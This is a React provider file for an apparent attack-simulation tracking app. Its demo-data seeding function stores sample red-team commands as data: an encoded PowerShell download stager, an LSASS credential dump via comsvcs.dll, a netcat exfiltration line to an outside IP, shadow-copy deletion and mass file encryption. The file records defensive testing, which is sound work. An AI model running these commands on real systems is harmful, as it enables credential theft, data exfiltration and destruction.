/*
 * Copyright 2024 Control Drift Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import React, { createContext, useContext, useEffect, useCallback, useMemo, useRef } from 'react';
import { useToast } from './components/ui/Toast';

// Hooks
import { useDbConnection } from './hooks/useDbConnection';
import { useEventsData } from './hooks/useEventsData';
import { useGapsData } from './hooks/useGapsData';
import { useMitreData } from './hooks/useMitreData';
import { useSimulationsData } from './hooks/useSimulationsData';
import { useEventActions } from './hooks/useEventActions';
import { useAiData } from './hooks/useAiData';
import { useTagsData } from './hooks/useTagsData';
import { useSecurityControlsData } from './hooks/useSecurityControlsData';
import { useAppUI } from './hooks/useAppUI';

/**
 * ============================================================================
 * NOMENCLATURE GUIDE
 * ============================================================================
 * 
 * To ensure maintainability, please adhere to the following internal definitions
 * regardless of what the UI labels might temporarily display:
 * 
 * 1. "Event" (Data Table: `events`, State: `events`)
 *    - An Event represents a single, atomic test of a specific TTP (e.g., T1048).
 *    - It contains the finding, outcome, remediation notes, and coverage rating.
 * 
 * 2. "Simulation" (Data Table: `simulations`, State: `simulationSummaries`)
 *    - A Simulation is an aggregate collection or "campaign" of multiple Events.
 *    - Example: "Q3 Ransomware Campaign".
 *    - It stores a JSONB summary block and evidence attachments.
 * 
 * 3. "Gap" (Data Table: `gaps`, State: `gaps`)
 *    - A Gap is a ticketing construct representing a missing control or coverage blindspot
 *      identified during an Event.
 *    - It tracks remediation status, validation re-testing, and risk acceptance.
 * 
 * ============================================================================
 */

const AppContext = createContext();

export const useAppContext = () => useContext(AppContext);

/**
 * AppProvider
 * 
 * The global context provider for Eclipse Ops. It aggressively extracts state
 * and business logic into modular custom hooks (e.g., `useEventsData`, `useDbConnection`).
 * It acts as the central orchestrator, passing unified state down to all components.
 */
export const AppProvider = ({ children }) => {
    // 1. App UI (Toast, Confirm Modal, offline syncing logic)
    const { 
        confirmConfig, confirmAction, closeConfirm,
        requestSuccessToast, checkSyncQueue, addToast
    } = useAppUI();

    // 2. DB Connection
    const { 
        dbConfig, setDbConfig, 
        dbAdapter, 
        isAuthenticated, setIsAuthenticated, 
        isDbLoading, userRole, initDb, globalAiConfig
    } = useDbConnection();

    // 3. Data Hooks
    const exData = useEventsData(dbAdapter, addToast);
    const gapsData = useGapsData(dbAdapter, addToast);
    const simsData = useSimulationsData(dbAdapter, addToast);
    const tagsData = useTagsData();
    const securityControlsData = useSecurityControlsData();

    // Dynamically extract global metadata from data to ensure nothing is lost
    useEffect(() => {
        if (!exData.allEventsData) return;

        const envSet = new Set(gapsData.targetEnvironments || []);
        const tagSet = new Set(tagsData.targetTags || []);
        const scSet = new Set(securityControlsData.targetSecurityControls || []);

        let envChanged = false;
        let tagChanged = false;
        let scChanged = false;

        const parseAndAdd = (val, set, setChangedFlag) => {
            if (!val) return;
            let parsed = val;
            if (typeof val === 'string') {
                try { parsed = JSON.parse(val); } catch(e) { parsed = val.split(','); }
            }
            if (Array.isArray(parsed)) {
                parsed.forEach(v => {
                    if (typeof v === 'string' && v.trim()) {
                        const trimmed = v.trim();
                        if (!Array.from(set).some(item => item.toLowerCase() === trimmed.toLowerCase())) {
                            set.add(trimmed);
                            setChangedFlag();
                        }
                    }
                });
            } else if (typeof parsed === 'string' && parsed.trim()) {
                const trimmed = parsed.trim();
                if (!Array.from(set).some(item => item.toLowerCase() === trimmed.toLowerCase())) {
                    set.add(trimmed);
                    setChangedFlag();
                }
            }
        };

        const processItem = (item) => {
            parseAndAdd(item.environment || item.environments, envSet, () => envChanged = true);
            parseAndAdd(item.tags || item.tag, tagSet, () => tagChanged = true);
            parseAndAdd(item.securityControls || item.securityControl, scSet, () => scChanged = true);
        };

        Object.values(exData.allEventsData).forEach(processItem);
        if (gapsData.gaps) gapsData.gaps.forEach(processItem);
        if (simsData.simulationSummaries) {
            Object.values(simsData.simulationSummaries).forEach(sim => {
                if (sim.details) processItem(sim.details);
                if (sim.testResults && Array.isArray(sim.testResults)) {
                    sim.testResults.forEach(processItem);
                }
            });
        }

        if (envChanged && gapsData.setTargetEnvironments) gapsData.setTargetEnvironments(Array.from(envSet).sort());
        if (tagChanged && tagsData.setTargetTags) tagsData.setTargetTags(Array.from(tagSet).sort());
        if (scChanged && securityControlsData.setTargetSecurityControls) securityControlsData.setTargetSecurityControls(Array.from(scSet).sort());

    }, [exData.allEventsData, gapsData.gaps, simsData.simulationSummaries]); // intentionally omitting setters to avoid infinite loops

    // 4. Mitre Hook
    const filteredExercisesForMitre = useMemo(() => {
        if (!exData.allEventsData) return {};
        let filtered = exData.allEventsData;

        if (tagsData.activeTagFilter !== 'All') {
            const temp = {};
            const targetFilter = tagsData.activeTagFilter.trim().toLowerCase();
            Object.entries(filtered).forEach(([k, ex]) => {
                let tags = [];
                const addTags = (source) => {
                    if (!source) return;
                    let parsedSource = source;
                    if (typeof source === 'string') {
                        try {
                            parsedSource = JSON.parse(source);
                        } catch(e) {
                            parsedSource = source.split(',');
                        }
                    }
                    if (Array.isArray(parsedSource)) {
                        parsedSource.forEach(s => {
                            if (typeof s === 'string') tags.push(s.trim());
                        });
                    }
                };

                addTags(ex.tags);
                
                if (ex.simulation && simsData.simulationSummaries[ex.simulation]) {
                    const sim = simsData.simulationSummaries[ex.simulation];
                    addTags(sim.details?.tags);
                    
                    if (sim.testResults && Array.isArray(sim.testResults)) {
                        sim.testResults.forEach(tr => {
                            let trTtps = [];
                            if (typeof tr.ttps === 'string') {
                                try {
                                    trTtps = JSON.parse(tr.ttps);
                                } catch(e) {
                                    trTtps = tr.ttps.split(',');
                                }
                            } else if (Array.isArray(tr.ttps)) {
                                trTtps = tr.ttps;
                            }
                            
                            const matchesTtp = trTtps.some(id => {
                                if (!id) return false;
                                const idStr = String(id).trim();
                                const exTtpStr = String(ex.ttp || ex.ttps || '').trim();
                                return idStr === exTtpStr || idStr.startsWith(`${exTtpStr}.`) || exTtpStr.startsWith(`${idStr}.`);
                            });

                            if (matchesTtp) {
                                addTags(tr.tags);
                            }
                        });
                    }
                }

                if (tags.some(t => typeof t === 'string' && t.trim().toLowerCase() === targetFilter)) {
                    temp[k] = ex;
                }
            });
            filtered = temp;
        }

        if (securityControlsData.activeSecurityControlFilter !== 'All') {
            const temp = {};
            const targetFilter = securityControlsData.activeSecurityControlFilter.trim().toLowerCase();
            Object.entries(filtered).forEach(([k, ex]) => {
                let controls = [];
                const addControls = (source) => {
                    if (!source) return;
                    let parsedSource = source;
                    if (typeof source === 'string') {
                        try {
                            parsedSource = JSON.parse(source);
                        } catch (e) {
                            parsedSource = source.split(',');
                        }
                    }
                    if (Array.isArray(parsedSource)) {
                        parsedSource.forEach(s => {
                            if (typeof s === 'string') controls.push(s.trim());
                        });
                    }
                };

                addControls(ex.securityControls);
                
                if (ex.simulation && simsData.simulationSummaries[ex.simulation]) {
                    const sim = simsData.simulationSummaries[ex.simulation];
                    addControls(sim.details?.securityControls);
                    
                    if (sim.testResults && Array.isArray(sim.testResults)) {
                        sim.testResults.forEach(tr => {
                            let trTtps = [];
                            if (typeof tr.ttps === 'string') {
                                try {
                                    trTtps = JSON.parse(tr.ttps);
                                } catch(e) {
                                    trTtps = tr.ttps.split(',');
                                }
                            } else if (Array.isArray(tr.ttps)) {
                                trTtps = tr.ttps;
                            }
                            
                            const matchesTtp = trTtps.some(id => {
                                if (!id) return false;
                                const idStr = String(id).trim();
                                const exTtpStr = String(ex.ttp || ex.ttps || '').trim();
                                return idStr === exTtpStr || idStr.startsWith(`${exTtpStr}.`) || exTtpStr.startsWith(`${idStr}.`);
                            });

                            if (matchesTtp) {
                                addControls(tr.securityControls);
                            }
                        });
                    }
                }

                if (controls.some(c => typeof c === 'string' && c.trim().toLowerCase() === targetFilter)) {
                    temp[k] = ex;
                }
            });
            filtered = temp;
        }

        return filtered;
    }, [exData.allEventsData, tagsData.activeTagFilter, securityControlsData.activeSecurityControlFilter, simsData.simulationSummaries]);

    const mitreHook = useMitreData(dbAdapter, filteredExercisesForMitre);

    // 5. Actions Hook (complex business logic)
    const actions = useEventActions({
        dbAdapter,
        exercisesPage: exData.exercisesPage,
        exercisesLimit: exData.exercisesLimit,
        fetchEventsPage: exData.fetchEventsPage,
        setExercises: exData.setExercises,
        allEventsData: exData.allEventsData,
        setAllEventsData: exData.setAllEventsData,
        gaps: gapsData.gaps,
        setGaps: gapsData.setGaps,
        loadMitreCoverage: () => {}, // Handled reactively now
        simulationSummaries: simsData.simulationSummaries,
        setSimulationSummaries: simsData.setSimulationSummaries,
        simulationEvidence: simsData.simulationEvidence,
        events: exData.events,
        addToast
    });

    // 9. AI Integration
    const aiData = useAiData(addToast, globalAiConfig);

    // The loadData function orchestrates loading all entities
    const loadData = useCallback(async (adapter) => {
        if (!adapter) return;
        
        await exData.loadAllData(adapter);
        await gapsData.fetchGaps(adapter);
        await simsData.fetchSimulations(adapter);
        
        // Load initial Mitre skeleton
        await mitreHook.loadMitreSkeleton();
    }, [exData.loadAllData, gapsData.fetchGaps, simsData.fetchSimulations, mitreHook.loadMitreSkeleton]);

    const loadDataRef = useRef(loadData);
    useEffect(() => { loadDataRef.current = loadData; }, [loadData]);

    // Initialize DB on mount
    useEffect(() => {
        initDb((adapter) => loadDataRef.current(adapter));
    }, [dbConfig, initDb]);

    // Sync queue interval
    useEffect(() => {
        const interval = setInterval(() => checkSyncQueue(dbAdapter, isAuthenticated), 15000);
        return () => clearInterval(interval);
    }, [dbAdapter, isAuthenticated, checkSyncQueue]);

    // Multi-tab desync handler
    useEffect(() => {
        let timeoutId;
        const handleStorage = (e) => {
            if (e.key && e.key.startsWith('eclipse_ops_')) {
                if (dbAdapter) {
                    clearTimeout(timeoutId);
                    timeoutId = setTimeout(() => {
                        loadDataRef.current(dbAdapter);
                        addToast("Data synchronized from another tab.", "info");
                    }, 300);
                }
            }
        };
        window.addEventListener('storage', handleStorage);
        return () => {
            clearTimeout(timeoutId);
            window.removeEventListener('storage', handleStorage);
        };
    }, [dbAdapter, addToast]);

    // Quota Exceeded handler
    useEffect(() => {
        const handleQuota = () => {
            addToast("Storage Limit Reached! You have exceeded the 5MB local storage quota. Please delete old simulations or export your data to free up space.", "error");
        };
        window.addEventListener('storage_quota_exceeded', handleQuota);
        return () => window.removeEventListener('storage_quota_exceeded', handleQuota);
    }, [addToast]);

    const isReadOnly = useMemo(() => userRole === 'reader', [userRole]);

    const injectTestData = useCallback(async () => {
        if (!dbAdapter) {
            addToast("Database adapter not initialized.", "error");
            return;
        }
        
        try {
            await dbAdapter.saveData('events', []);
            await dbAdapter.saveData('gaps', []);
            await dbAdapter.saveData('simulationSummaries', {});
            await dbAdapter.saveData('simulationEvidence', {});

            const newExercises = [];
            const newSummaries = {};
            const newGaps = [];
            
            // Helper to generate dates
            const daysAgo = (days) => new Date(Date.now() - days * 24 * 60 * 60 * 1000).toISOString();

            // CAMPAIGN 1: APT29 Emulation (Cozy Bear)
            const c1_simName = "Q3 APT29 Emulation (Cozy Bear)";
            newExercises.push({
                id: `demo-c1-ex1`, campaign: "Q3 APT29 Emulation", simulation: c1_simName,
                finding: `Execution of obfuscated PowerShell payload mimicking APT29 staging`,
                remediation: `Event: PowerShell execution detected and blocked by EDR behavioral engine`,
                environment: 'Windows Enclave', date: daysAgo(5), status: 'high', severity: 'High',
                ttp: 'T1059.001', securityControls: ['CrowdStrike', 'Windows Defender'], tags: ['Initial Access', 'APT29']
            });
            newExercises.push({
                id: `demo-c1-ex2`, campaign: "Q3 APT29 Emulation", simulation: c1_simName,
                finding: `Credential dumping via comsvcs.dll targeting LSASS`,
                remediation: `Event: LSASS access allowed, but alert triggered in SIEM. EDR failed to block.`,
                environment: 'Windows Enclave', date: daysAgo(4), status: 'medium', severity: 'Critical',
                ttp: 'T1003.001', securityControls: ['CrowdStrike', 'Splunk'], tags: ['Credential Access', 'APT29']
            });
            newExercises.push({
                id: `demo-c1-ex3`, campaign: "Q3 APT29 Emulation", simulation: c1_simName,
                finding: `Creation of malicious Windows Service for persistence`,
                remediation: `Event: Service created successfully, no alerts generated. Complete blindspot.`,
                environment: 'Windows Enclave', date: daysAgo(4), status: 'low', severity: 'High',
                ttp: 'T1543.003', securityControls: ['Splunk'], tags: ['Persistence', 'APT29']
            });
            newGaps.push({
                id: 'gap-c1-1', finding: 'CrowdStrike failed to prevent LSASS dump via comsvcs.dll',
                details: 'During APT29 emulation, the EDR agent failed to prevent a Minidump of LSASS via comsvcs.dll. An alert was fired in Splunk, but prevention was bypassed.',
                status: 'Open', severity: 'Critical', environment: 'Windows Enclave', createdDate: daysAgo(4), ttp: 'T1003.001'
            });
            newGaps.push({
                id: 'gap-c1-2', finding: 'Missing telemetry for malicious service creation',
                details: 'Service creation events (Event ID 7045) are not currently being ingested into Splunk from the Windows Enclave, resulting in a persistence blindspot.',
                status: 'Resolved', severity: 'High', environment: 'Windows Enclave', createdDate: daysAgo(4), resolvedDate: daysAgo(1), ttp: 'T1543.003'
            });
            newSummaries[c1_simName] = {
                summary: `Emulation of APT29 focused on stealthy persistence and credential access. Found critical gaps in EDR prevention policies for LSASS.`,
                details: { 
                    environmentCategory: 'Windows Enclave', 
                    tags: ['APT29', 'Nation State'],
                    securityControls: ['CrowdStrike Falcon', 'Splunk SIEM', 'Windows Defender'],
                    participants: [{ name: 'Red Team AI', role: 'Attacker' }, { name: 'SOC Analyst', role: 'Defender' }]
                },
                testResults: [
                    { 
                        id: `res-c1-1`, name: `Obfuscated PS1 Stager`, eventType: 'Payload Execution', 
                        expectedOutcome: 'Prevented', outcome: `Prevented`, ttps: [`T1059.001`], severity: `High`, 
                        execNotes: `Executed heavily obfuscated base64 payload via IEX (New-Object Net.WebClient).DownloadString.`,
                        detNotes: `CrowdStrike successfully identified behavioral markers and terminated the powershell.exe child process.`,
                        payloadCode: `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...` 
                    },
                    { 
                        id: `res-c1-2`, name: `LSASS Minidump`, eventType: 'API Hooking', 
                        expectedOutcome: 'Prevented', outcome: `Missed`, ttps: [`T1003.001`], severity: `Critical`, 
                        execNotes: `Used rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (PID) lsass.dmp full`,
                        detNotes: `Prevention failed. Splunk ingested Event ID 11 (FileCreate) but EDR did not block the memory access. Gap opened.`,
                        procedureSteps: `1. Obtain PID of lsass.exe\n2. Execute rundll32.exe comsvcs.dll\n3. Exfiltrate minidump`
                    },
                    { 
                        id: `res-c1-3`, name: `Service Persistence`, eventType: 'Registry/Service Modification', 
                        expectedOutcome: 'Alerted', outcome: `Missed ➔ Logged`, ttps: [`T1543.003`], severity: `High`, 
                        execNotes: `sc.exe create "WindowsUpdateSvc" binPath= "C:\\Temp\\beacon.exe" start= auto`,
                        detNotes: `Initially completely missed due to missing Event ID 7045 telemetry. Forwarder config updated yesterday. Now logging correctly, but still needs alerting logic.`,
                        payloadCode: `sc.exe create "SysSvc" binPath= "cmd.exe /c echo beacon" start= auto`
                    }
                ]
            };

            // CAMPAIGN 2: Insider Threat - Data Exfiltration
            const c2_simName = "Insider Threat - Data Exfiltration";
            newExercises.push({
                id: `demo-c2-ex1`, campaign: "Insider Threat Assessment", simulation: c2_simName,
                finding: `Archiving of sensitive HR documents into password-protected ZIP`,
                remediation: `Event: Action logged by DLP but no alert generated for analyst review`,
                environment: 'macOS Fleet', date: daysAgo(12), status: 'minimal', severity: 'Medium',
                ttp: 'T1560.001', securityControls: ['Palo Alto Cortex', 'Splunk'], tags: ['Insider Threat', 'Collection']
            });
            newExercises.push({
                id: `demo-c2-ex2`, campaign: "Insider Threat Assessment", simulation: c2_simName,
                finding: `Data exfiltration over non-standard port (TCP 8443) to unknown IP`,
                remediation: `Event: Exfiltration succeeded. Next-Gen Firewall did not drop non-web traffic over 8443.`,
                environment: 'macOS Fleet', date: daysAgo(12), status: 'low', severity: 'Critical',
                ttp: 'T1048.003', securityControls: ['Palo Alto NGFW'], tags: ['Insider Threat', 'Exfiltration']
            });
            newGaps.push({
                id: 'gap-c2-1', finding: 'NGFW allowing arbitrary protocols over Port 8443',
                details: 'The Palo Alto firewall is configured to allow any protocol over TCP 8443 out to the internet, rather than restricting it to strictly HTTPS/TLS.',
                status: 'Risk Accepted', severity: 'Critical', environment: 'macOS Fleet', createdDate: daysAgo(12), ttp: 'T1048.003'
            });
            newSummaries[c2_simName] = {
                summary: `Assessed DLP and network perimeter controls against data staging and exfiltration. Highlighted critical egress filtering gaps.`,
                details: { 
                    environmentCategory: 'macOS Fleet', 
                    tags: ['Insider Threat', 'Exfiltration'],
                    securityControls: ['Palo Alto NGFW', 'Cortex XDR', 'Splunk SIEM'],
                    participants: [{ name: 'Blue Team AI', role: 'Defender' }]
                },
                testResults: [
                    { 
                        id: `res-c2-1`, name: `Data Staging (ZIP)`, eventType: 'Local File Action', 
                        expectedOutcome: 'Alerted', outcome: `Logged`, ttps: [`T1560.001`], severity: `Medium`, 
                        execNotes: `Compressed 500 mock HR PDF files into a password-protected zip file using ditto.`,
                        detNotes: `Cortex XDR logged the bulk file read and zip creation, but SIEM correlation rule did not fire due to threshold mismatch.`,
                        procedureSteps: `1. Find all PDFs in ~/Documents\n2. Zip with AES-256 encryption`
                    },
                    { 
                        id: `res-c2-2`, name: `C2 Exfiltration`, eventType: 'Network Egress', 
                        expectedOutcome: 'Prevented', outcome: `Missed`, ttps: [`T1048.003`], severity: `Critical`, 
                        execNotes: `Sent the ZIP file over raw TCP socket on port 8443 to an external IP.`,
                        detNotes: `Traffic allowed out of NGFW. NGFW policy for 8443 is 'any' instead of 'ssl-only'. Risk Accepted by network engineering.`,
                        payloadCode: `cat staged_data.zip | nc -w 3 198.51.100.14 8443`
                    }
                ]
            };

            // CAMPAIGN 3: Ransomware Readiness (Conti)
            const c3_simName = "Ransomware Readiness (Conti)";
            newExercises.push({
                id: `demo-c3-ex1`, campaign: "Conti Ransomware Readiness", simulation: c3_simName,
                finding: `VSS (Volume Shadow Copy) deletion via vssadmin.exe`,
                remediation: `Event: Command blocked by EDR ransomware behavioral heuristics`,
                environment: 'AWS Prod VPC', date: daysAgo(1), status: 'high', severity: 'Critical',
                ttp: 'T1490', securityControls: ['CrowdStrike'], tags: ['Ransomware', 'Impact']
            });
            newExercises.push({
                id: `demo-c3-ex2`, campaign: "Conti Ransomware Readiness", simulation: c3_simName,
                finding: `Lateral movement via RDP using compromised domain admin credentials`,
                remediation: `Event: RDP connection established. Anomalous login alerted by UEBA.`,
                environment: 'AWS Prod VPC', date: daysAgo(1), status: 'medium', severity: 'High',
                ttp: 'T1021.001', securityControls: ['Splunk UEBA'], tags: ['Ransomware', 'Lateral Movement']
            });
            newExercises.push({
                id: `demo-c3-ex3`, campaign: "Conti Ransomware Readiness", simulation: c3_simName,
                finding: `Mass file encryption simulation on network share`,
                remediation: `Event: Encryption interrupted and blocked by EDR after 50 files encrypted`,
                environment: 'AWS Prod VPC', date: daysAgo(1), status: 'high', severity: 'Critical',
                ttp: 'T1486', securityControls: ['CrowdStrike'], tags: ['Ransomware', 'Impact']
            });
            newGaps.push({
                id: 'gap-c3-1', finding: 'RDP unrestricted between AWS Subnets',
                details: 'Lateral movement was possible because RDP is not segmented between production subnets in the VPC.',
                status: 'Open', severity: 'High', environment: 'AWS Prod VPC', createdDate: daysAgo(1), ttp: 'T1021.001'
            });
            newSummaries[c3_simName] = {
                summary: `Simulated a Conti ransomware outbreak. Impact was successfully mitigated by EDR, but lateral movement is still largely unrestricted.`,
                details: { 
                    environmentCategory: 'AWS Prod VPC', 
                    tags: ['Ransomware', 'Conti', 'AWS'],
                    securityControls: ['CrowdStrike Falcon', 'Splunk UEBA', 'AWS Security Groups'],
                    participants: [{ name: 'Red Team AI', role: 'Attacker' }]
                },
                testResults: [
                    { 
                        id: `res-c3-1`, name: `VSS Deletion`, eventType: 'CLI Execution', 
                        expectedOutcome: 'Prevented', outcome: `Prevented`, ttps: [`T1490`], severity: `Critical`, 
                        execNotes: `Attempted to delete volume shadow copies using standard Conti vssadmin syntax.`,
                        detNotes: `Blocked immediately by CrowdStrike ransomware prevention policy.`,
                        payloadCode: `vssadmin.exe Delete Shadows /All /Quiet`
                    },
                    { 
                        id: `res-c3-2`, name: `RDP Lateral Movement`, eventType: 'Network Authentication', 
                        expectedOutcome: 'Prevented', outcome: `Missed`, ttps: [`T1021.001`], severity: `High`, 
                        execNotes: `Authenticated via RDP to a neighboring EC2 instance using hijacked DA credentials.`,
                        detNotes: `Splunk UEBA generated an Impossible Travel / Anomalous Login alert, but lateral movement succeeded due to lack of network segmentation (Security Groups). Gap open.`,
                        procedureSteps: `1. Pivot via SOCKS proxy\n2. Establish RDP session to 10.0.4.15`
                    },
                    { 
                        id: `res-c3-3`, name: `File Encryption`, eventType: 'File IO', 
                        expectedOutcome: 'Prevented', outcome: `Prevented`, ttps: [`T1486`], severity: `Critical`, 
                        execNotes: `Executed script to rapid-encrypt files using ChaCha20 on mounted EFS share.`,
                        detNotes: `CrowdStrike detected mass file modifications. Process terminated after 50 files encrypted.`,
                        payloadCode: `python -c "import os, cryptography; [encrypt_file(f) for f in os.listdir('/mnt/efs/data')]"`
                    }
                ]
            };

            if (typeof dbAdapter.bulkImport === 'function') {
                await dbAdapter.bulkImport({
                    events: newExercises,
                    gaps: newGaps,
                    simulationSummaries: newSummaries,
                    simulationEvidence: {}
                });
            } else {
                await dbAdapter.saveData('events', newExercises);
                await dbAdapter.saveData('gaps', newGaps);
                await dbAdapter.saveData('simulationSummaries', newSummaries);
                await dbAdapter.saveData('simulationEvidence', {});
            }

            await loadDataRef.current(dbAdapter);
            addToast("Successfully loaded Enterprise Demo Data!", "success");
        } catch (err) {
            console.error("Injection failed:", err);
            addToast(`Test data injection failed: ${err.message}`, "error");
        }
    }, [dbAdapter, addToast]);

    // Compress image utility
    const compressImage = useCallback((dataUrl, maxWidth = 1600) => {
        return new Promise((resolve) => {
          const img = new Image();
          img.src = dataUrl;
          img.onload = () => {
            if (img.width <= maxWidth) { resolve(dataUrl); return; }
            const canvas = document.createElement('canvas');
            const ratio = maxWidth / img.width;
            canvas.width = maxWidth;
            canvas.height = img.height * ratio;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            resolve(canvas.toDataURL('image/jpeg', 0.75));
          };
        });
    }, []);

    // Toggle Tactic Scope
    const toggleTacticScope = useCallback((tacticName) => {
        mitreHook.setBaseMitreData(prev => {
            const next = JSON.parse(JSON.stringify(prev));
            const tactic = next[tacticName];
            if (!tactic) return prev;
            const allNa = tactic.techniques.every(t => t.status === 'na');
            const targetStatus = allNa ? 'unknown' : 'na';
            tactic.techniques.forEach(tech => {
                if (tech.status === 'unknown' || tech.status === 'na') tech.status = targetStatus;
            });
            return next;
        });
    }, [mitreHook.setBaseMitreData]);

    // Toggle Technique Scope
    const toggleTechniqueScope = useCallback((techId, environment = 'All') => {
        mitreHook.setBaseMitreData(prev => {
            const next = JSON.parse(JSON.stringify(prev));
            let targetStatus = null;
            for (const tactic in next) {
                const t = next[tactic].techniques.find(t => t.id === techId);
                if (t) { targetStatus = t.status === 'na' ? 'unknown' : 'na'; break; }
            }
            if (!targetStatus) return next;
            for (const tactic in next) {
                const tIdx = next[tactic].techniques.findIndex(t => t.id === techId);
                if (tIdx > -1) {
                    next[tactic].techniques[tIdx].status = targetStatus;
                    if (environment !== 'All') {
                        if (!next[tactic].techniques[tIdx].environments) next[tactic].techniques[tIdx].environments = {};
                        next[tactic].techniques[tIdx].environments[environment] = targetStatus;
                    }
                }
            }
            return next;
        });
    }, [mitreHook.setBaseMitreData]);

    const contextValue = useMemo(() => ({
        // Connection & Auth
        dbConfig, setDbConfig, dbAdapter, isDbLoading, isAuthenticated, setIsAuthenticated, userRole, isReadOnly, loadData,
        // Events
        ...exData,
        // Gaps & Tags & Controls
        ...gapsData,
        ...tagsData,
        ...securityControlsData,
        // Simulations
        ...simsData,
        // Mitre
        mitreData: mitreHook.mitreData, setMitreData: mitreHook.setBaseMitreData, isMitreLoading: mitreHook.isMitreLoading, mitreProgress: mitreHook.mitreProgress, loadMitreCoverage: mitreHook.loadMitreSkeleton,
        // Actions
        completeExercise: actions.completeExercise, updateEventValidation: actions.updateEventValidation, revertEventValidation: actions.revertEventValidation, deleteSimulation: actions.deleteSimulation,
        toggleTacticScope, toggleTechniqueScope, injectTestData,
        // AI
        ...aiData,
        // UI
        confirmAction, requestSuccessToast, compressImage
    }), [
        dbConfig, dbAdapter, isDbLoading, isAuthenticated, userRole, isReadOnly, loadData,
        exData, gapsData, simsData, tagsData, securityControlsData, mitreHook, actions, aiData, confirmAction, requestSuccessToast, compressImage, toggleTacticScope, toggleTechniqueScope, injectTestData
    ]);

    return (
        <AppContext.Provider value={contextValue}>
            {children}
            {confirmConfig.isOpen && (
                <div className="animate-fade-in" style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(5, 5, 10, 0.85)', backdropFilter: 'blur(12px)', zIndex: 99999, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <div className="glass-panel" style={{ width: '400px', padding: '24px', background: 'rgba(11, 12, 16, 0.95)', border: '1px solid var(--accent-primary)', borderRadius: '12px', display: 'flex', flexDirection: 'column', gap: '20px', boxShadow: '0 0 30px rgba(126, 34, 206, 0.3)' }}>
                        <h3 style={{ margin: 0, color: 'var(--text-primary)', fontSize: '1.2rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
                            Confirmation Required
                        </h3>
                        <p style={{ margin: 0, color: 'var(--text-secondary)', fontSize: '0.95rem', lineHeight: '1.5' }}>
                            {confirmConfig.message}
                        </p>
                        <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px', marginTop: '10px' }}>
                            <button className="btn hover-lift" onClick={closeConfirm} style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid var(--glass-border)', color: 'var(--text-primary)', padding: '8px 16px', borderRadius: '6px' }}>Cancel</button>
                            <button className="btn hover-lift" onClick={() => { confirmConfig.onConfirm(); closeConfirm(); }} style={{ background: 'var(--danger)', color: '#fff', border: 'none', padding: '8px 16px', borderRadius: '6px', fontWeight: 'bold' }}>Confirm</button>
                        </div>
                    </div>
                </div>
            )}
        </AppContext.Provider>
    );
};
